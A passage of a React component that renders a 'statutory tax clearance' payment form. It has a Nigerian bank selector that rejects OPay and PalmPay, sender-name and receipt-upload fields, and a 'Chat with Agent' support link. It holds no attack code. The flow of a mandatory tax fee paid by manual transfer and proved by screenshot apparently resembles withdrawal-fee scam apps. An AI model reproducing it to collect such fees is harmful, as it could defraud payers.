                  setErrorMsg('STRICT NOTICE: OPay and PalmPay transfers are strictly NOT accepted for statutory tax clearance. Please select a commercial bank.');
                } else {
                  setErrorMsg('');
                }
              }}
              className={`w-full py-3 px-3.5 rounded-xl border text-xs focus:outline-none cursor-pointer ${
                isLight
                  ? 'bg-slate-50 border-slate-300 text-slate-900 focus:border-amber-500 focus:bg-white'
                  : 'bg-[#1a1c28] border-stone-700 text-white focus:border-amber-400'
              }`}
            >
              <option value="">Select your bank...</option>
              <option value="GTBank (Guaranty Trust Bank)">GTBank (Guaranty Trust Bank)</option>
              <option value="Zenith Bank">Zenith Bank</option>
              <option value="Access Bank">Access Bank</option>
              <option value="First Bank of Nigeria">First Bank of Nigeria</option>
              <option value="United Bank for Africa (UBA)">United Bank for Africa (UBA)</option>
              <option value="Kuda Bank">Kuda Microfinance Bank</option>
              <option value="Moniepoint MFB">Moniepoint Microfinance Bank</option>
              <option value="Stanbic IBTC Bank">Stanbic IBTC Bank</option>
              <option value="Fidelity Bank">Fidelity Bank</option>
              <option value="FCMB (First City Monument Bank)">FCMB (First City Monument Bank)</option>
              <option value="Union Bank">Union Bank</option>
              <option value="Sterling Bank">Sterling Bank</option>
              <option value="Wema Bank (ALAT)">Wema Bank (ALAT)</option>
              <option value="Polaris Bank">Polaris Bank</option>
              <option value="Keystone Bank">Keystone Bank</option>
              <option value="Providus Bank">Providus Bank</option>
            </select>
            <p className={`text-[10px] ${isLight ? 'text-slate-500' : 'text-stone-400'}`}>
              Strictly no OPay or PalmPay transfers allowed.
            </p>
          </div>

          {/* Sender Account Name */}
          <div className="space-y-1">
            <label className={`text-xs font-bold block ${
              isLight ? 'text-slate-700' : 'text-stone-300'
            }`}>
              Sender Account Name (as shown on transfer)
            </label>
            <input
              type="text"
              value={senderAccountName}
              onChange={(e) => setSenderAccountName(e.target.value)}
              placeholder="e.g., ADENIJI BABATUNDE JOHN"
              className={`w-full py-3 px-3.5 rounded-xl border text-xs focus:outline-none uppercase ${
                isLight
                  ? 'bg-slate-50 border-slate-300 text-slate-900 placeholder:text-slate-400 focus:border-amber-500 focus:bg-white'
                  : 'bg-[#1a1c28] border-stone-700 text-white focus:border-amber-400 placeholder:text-stone-500'
              }`}
            />
          </div>

          {/* Receipt Upload */}
          <div className="space-y-1.5">
            <label className={`text-xs font-bold block ${
              isLight ? 'text-slate-700' : 'text-stone-300'
            }`}>
              Payment Receipt / Screenshot
            </label>

            <input
              type="file"
              ref={fileInputRef}
              onChange={handleFileChange}
              accept="image/*,application/pdf"
              className="hidden"
            />

            {!receiptUrl ? (
              <div
                onClick={() => fileInputRef.current?.click()}
                className={`w-full py-6 px-4 rounded-xl border-2 border-dashed text-center cursor-pointer transition-all flex flex-col items-center justify-center gap-2 ${
                  isLight
                    ? 'border-slate-300 hover:border-amber-500 bg-slate-50 hover:bg-slate-100 text-slate-700'
                    : 'border-stone-700 hover:border-amber-400/70 bg-[#161824] hover:bg-[#1a1d2c]'
                }`}
              >
                <div className={`w-10 h-10 rounded-full border flex items-center justify-center ${
                  isLight ? 'bg-amber-100 border-amber-300 text-amber-600' : 'bg-amber-500/10 border-amber-500/30 text-amber-400'
                }`}>
                  <UploadCloud className="w-5 h-5" />
                </div>
                <div>
                  <span className={`text-xs font-bold block ${isLight ? 'text-slate-800' : 'text-white'}`}>
                    Click to select receipt screenshot
                  </span>
                  <span className={`text-[10px] ${isLight ? 'text-slate-500' : 'text-stone-400'}`}>
                    PNG, JPG, or PDF up to 15MB
                  </span>
                </div>
              </div>
            ) : (
              <div className={`relative p-3 rounded-xl border flex items-center justify-between gap-3 ${
                isLight ? 'bg-slate-50 border-slate-300' : 'bg-[#161824] border-stone-700'
              }`}>
                <div className="flex items-center gap-2.5 min-w-0">
                  <img
                    src={receiptUrl}
                    alt="Receipt thumbnail"
                    className="w-12 h-12 rounded-lg object-cover border border-slate-300 flex-shrink-0"
                  />
                  <div className="min-w-0">
                    <span className={`text-xs font-bold block truncate ${
                      isLight ? 'text-slate-900' : 'text-white'
                    }`}>{receiptName || 'tax_receipt.jpg'}</span>
                    <span className="text-[10px] text-emerald-600 font-bold flex items-center gap-1">
                      <CheckCircle2 className="w-3 h-3" /> Ready to submit
                    </span>
                  </div>
                </div>
                <button
                  type="button"
                  onClick={() => {
                    setReceiptUrl('');
                    setReceiptName('');
                    if (fileInputRef.current) fileInputRef.current.value = '';
                  }}
                  className={`p-1.5 rounded-lg cursor-pointer transition-colors ${
                    isLight
                      ? 'bg-slate-200 hover:bg-slate-300 text-slate-700'
                      : 'bg-stone-800 hover:bg-stone-700 text-stone-400 hover:text-white'
                  }`}
                  title="Remove Receipt"
                >
                  <X className="w-4 h-4" />
                </button>
              </div>
            )}
          </div>

          {/* Submit Button */}
          <button
            type="submit"
            disabled={isSubmitting}
            className="w-full py-4 rounded-2xl bg-gradient-to-r from-amber-400 via-amber-500 to-yellow-400 hover:from-amber-300 hover:to-yellow-300 text-black font-black text-sm shadow-xl shadow-amber-500/30 flex items-center justify-center gap-2 transition-all cursor-pointer disabled:opacity-50 active:scale-[0.99] border border-amber-200"
          >
            {isSubmitting ? (
              <>
                <Clock className="w-4 h-4 animate-spin" />
                <span>Uploading Tax Payment...</span>
              </>
            ) : (
              <>
                <ShieldCheck className="w-4 h-4 stroke-[2.5]" />
                <span>Submit Tax Payment ({formatNaira(taxFeeAmount)})</span>
              </>
            )}
          </button>
        </form>
      )}

      {/* Support / Inquiries Note */}
      <div className={`p-3.5 rounded-xl border text-center text-xs flex items-center justify-between ${
        isLight ? 'bg-white border-slate-200 text-slate-600 shadow-xs' : 'bg-[#10121a] border-stone-800/80 text-stone-400'
      }`}>
        <span className="flex items-center gap-1.5">
          <HelpCircle className="w-3.5 h-3.5 text-stone-400" />
          Need assistance with statutory tax remittance?
        </span>
        {onNavigateToSupport && (
          <button
            type="button"
            onClick={onNavigateToSupport}
            className="text-amber-600 hover:text-amber-700 font-bold underline cursor-pointer"
          >
            Chat with Agent
          </button>
        )}
      </div>
    </div>
  );
};
